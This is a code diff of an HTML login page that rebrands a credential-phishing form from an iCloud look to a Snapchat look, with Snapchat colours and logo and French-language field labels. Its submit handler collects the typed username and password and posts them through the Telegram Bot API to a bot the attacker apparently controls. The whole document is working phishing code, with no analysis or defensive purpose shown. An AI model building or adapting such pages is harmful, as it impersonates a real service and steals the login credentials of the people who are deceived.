@@ -9,7 +9,7 @@
             margin: 0;
             padding: 0;
             font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
+            background-color: #FFFC00; /* اللون الأصفر لسناب شات */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -19,11 +19,19 @@
         .container {
             width: 90%;
             max-width: 400px;
-            text-align: left;
+            background-color: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            width: 50px;
+            margin: 0 auto 20px;
         }
 
         h1 {
-            text-align: center;
             font-size: 24px;
             color: #333;
             margin-bottom: 30px;
@@ -46,21 +54,6 @@
             box-sizing: border-box;
         }
 
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .checkbox-group input {
-            margin-right: 10px;
-        }
-
-        .checkbox-group label {
-            font-size: 14px;
-            color: #aaa;
-        }
-
         a {
             font-size: 14px;
             color: #007bff;
@@ -77,8 +70,8 @@
         button {
             width: 100%;
             padding: 15px;
-            background-color: #d3d3d3;
-            color: #333;
+            background-color: #FFFC00;
+            color: black;
             border: none;
             border-radius: 25px;
             font-size: 16px;
@@ -88,12 +81,13 @@
         }
 
         button:hover {
-            background-color: #c0c0c0;
+            background-color: #fef200;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" alt="Snapchat Logo">
         <h1>Connexion</h1>
         <form onsubmit="sendToTelegram(event)">
             <label for="username">Nom d'utilisateur, adresse e-mail ou numéro de téléphone</label>
@@ -102,12 +96,7 @@
             <label for="password">Mot de passe</label>
             <input type="password" id="password" name="password" required>
 
-            <div class="checkbox-group">
-                <input type="checkbox" id="remember" name="remember">
-                <label for="remember">Enregistrer les informations de connexion sur vos appareils iCloud</label>
-            </div>
-
-            <a href="#">Mot de passe oublié ?</a>
+            <a href="#">Mot de passe oublié ؟</a>
 
             <button type="submit">Connexion</button>
         </form>
@@ -122,9 +111,8 @@
 
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
-            const remember = document.getElementById('remember').checked ? 'Oui' : 'Non';
 
-            const message = `👤 Nom d'utilisateur : ${username}\n🔒 Mot de passe : ${password}\n📁 Enregistrement des informations : ${remember}`;
+            const message = `👤 Nom d'utilisateur : ${username}\n🔒 Mot de passe : ${password}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
